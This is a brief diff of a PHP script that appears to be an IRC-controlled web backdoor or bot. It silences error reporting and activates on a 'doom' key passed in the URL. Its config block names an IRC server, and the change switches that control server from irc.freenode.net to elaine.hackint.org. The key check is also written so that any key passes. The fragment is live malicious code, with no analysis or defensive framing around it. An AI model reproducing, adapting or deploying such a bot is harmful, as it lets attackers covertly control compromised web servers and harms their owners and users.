@@ -5,7 +5,7 @@ error_reporting(0);
 if(isset($_GET['key']) == "doom") {
     class sell {
         var $config = array(
-					'server' => 'irc.freenode.net',
+					'server' => 'elaine.hackint.org',
 					'port' => '6667',
 					"key" => '',
 					'prefix' => 'Linux',
